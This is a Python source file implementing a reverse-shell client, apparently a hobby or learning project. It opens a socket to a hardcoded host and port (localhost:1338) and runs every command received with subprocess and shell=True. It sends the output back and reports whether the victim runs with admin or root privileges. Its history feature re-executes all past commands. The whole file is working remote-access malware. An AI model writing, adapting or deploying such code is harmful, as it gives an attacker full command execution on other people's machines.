
import os 
import socket 
import getpass
import sys 
import subprocess 
from datetime import datetime
import datetime
import time

cmd_history = []
mydata = """Hi and Welcome 

As you connect you can performe from this host any command on your own computer.
Please be aware to the permissions you are connected with.

for last Command you will print 'lass'

If exit is your desire please print 'exit'

histori - will give you the list of all the commands you performd on this host, all will be saved to a file named commands.txt\n\n"""


def get_user_priv():
    system_platform = sys.platform
    if "win" in system_platform:
        try:
            temp = os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\\windows'),'temp']))
            return user_privileges(True)
        except PermissionError:
            return user_privileges(False)
    else:
        if os.getuid() == 0:
            return user_privileges(True)
        else:
            return user_privileges(False)

def user_privileges(high):
    if high == True:
        return "#"
    else:
        return "$"
        
def permissions_awerness(user_perrmision):
    if user_perrmision == True:
        print('You are connected with HIGH permissions')
        
    else:
        print('You are connected with LOW permmisions')
        

def terminal_run(r_cmd):
    
    if 'cd' in r_cmd:
        try:
            os.chdir(r_cmd[3::])
            return " "
        except FileNotFoundError:
            return f":{r_cmd[3::]}: no such file or directory"
    
    elif r_cmd == 'cd ..':
        os.chdir(os.getcwd())
        return " "
    
    elif r_cmd == 'lass':
        lass_c = last_cmd(cmd_history)
        return lass_c  
    
    elif r_cmd == 'histori':
        return 'histori'

    cmd_out = subprocess.run(r_cmd, shell=True, capture_output=True)
    if cmd_out.stdout.decode("utf-8"):
        return cmd_out.stdout.decode("utf-8").strip("\n") 
    else:
        return cmd_out.stderr.decode("utf-8").strip('\n')
    

def c2c(r_ip,r_h):
    user_platform = sys.platform
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as c:
            c.connect((r_ip,r_h))
            c.sendall(mydata.encode())
            time.sleep(0.5)
            if get_user_priv() == True:
                c.send(b'You are connected with HIGH permissions\n')
            else:
                c.send(b'You are connected with LOW permissions\n')

            time.sleep(0.5)
            while True:
                if 'win' in user_platform:
                    shell_p = shell_p = f'{os.getcwd()}> '
                else:
                    shell_p = (f'{getpass.getuser()}@{socket.gethostname()}:{os.getcwd()}{get_user_priv()} ')
                c.send(shell_p.encode())
                s_cmdl = c.recv(2048)
                cmd_history.append(s_cmdl.decode())
                r_data = terminal_run(s_cmdl.decode('utf-8'))
                c.send(r_data.encode())
                time.sleep(0.5)
                if s_cmdl.decode() in ['exit','histori']:
                    c.close()
                    break
            return s_cmdl.decode()
    except Exception as e:
        return e
        

  
def last_cmd(cmd_history):
    date_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    l_cmd = cmd_history[-2]
    cmd_h = subprocess.run(l_cmd, shell=True, capture_output=True)
    cmd_h = cmd_h.stdout.decode("utf-8")
    last_c = (f'\t{date_time} - {l_cmd} <last command>\n{cmd_h}\n'.strip('\n'))
    return last_c
    
def histori(cmd_history):
    histori_list = []
    date_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    for command in cmd_history:
        comm_explanation = subprocess.run(command, shell=True, capture_output=True)
        comm_explanation = comm_explanation.stdout.decode("utf-8")
        new_command = (f'<Command> = {command}   <Time> = {date_time}\nOutput:{comm_explanation}\n')
        histori_list.append(new_command)

    print('\nHISTORY\n')    
    for num, i in enumerate(histori_list,1):
                print(num, i)
    return histori_list  
    
        
def cmd_file(histori_list):  
    comm_file = os.getcwd()
    comm_file = (f'{comm_file}/commands.txt')
    with open(comm_file, 'w+') as f:
        for comm in histori_list:
            f.write(comm)
        f.close

def main():
    permissions_awerness(get_user_priv())
    
    err_conn = c2c('127.0.0.1',1338)
 
    if err_conn == 'exit':
        print('Connections has ended server side')
    elif err_conn == 'histori':
        h_l = histori(cmd_history)
        cmd_file(h_l)
            
            
    else:
        print(err_conn)
        print('Sassion has ended')
        
try:
    main()

except KeyboardInterrupt:
    print('\n\nbye..\n ')
    
        

    
    

        
        
        
       
    
    
    

    